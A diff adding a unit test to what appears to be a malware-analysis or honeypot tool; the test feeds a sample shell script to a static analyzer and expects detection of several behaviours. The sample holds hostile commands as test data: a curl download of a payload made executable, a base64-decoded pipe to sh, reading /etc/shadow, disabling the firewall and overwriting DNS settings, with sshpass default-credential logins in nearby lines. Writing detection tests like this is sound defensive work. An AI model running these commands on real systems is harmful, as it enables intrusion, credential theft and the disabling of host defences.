@@ -232,6 +232,21 @@ sshpass -praspberryraspberry993311 ssh pi@$IP
         self.assertEqual(a["iocs"]["credentials"][0]["password"], "raspberry")
         self.assertEqual(a["iocs"]["credentials"][0]["username"], "pi")
 
+    def test_static_analysis_finds_encoded_scanning_and_system_tampering(self):
+        sample = b"""#!/bin/sh
+curl -fsS http://203.0.113.50/payload -o /tmp/payload
+chmod +x /tmp/payload
+echo ZWNobyBoaQ== | base64 -d | sh
+nmap -p 22 203.0.113.0/24
+cat /etc/shadow
+ufw disable
+echo nameserver 8.8.8.8 > /etc/resolv.conf
+"""
+        result = ha.analyze_sample(sample)
+        found = {item["id"] for item in result["script_analysis"]["behaviors"]}
+        self.assertTrue({"download-execute", "encoded-payload", "network-scan", "credential-access",
+                         "firewall-tampering", "dns-tampering"}.issubset(found))
+
     def test_domain_and_ssh_password_iocs_are_extracted(self):
         ioc = ha.find_iocs("host bins.deutschland-zahlung.eu; sshpass -praspberry scp x pi@$IP:/tmp/x")
         self.assertIn("bins.deutschland-zahlung.eu", [x["value"] for x in ioc["domains"]])
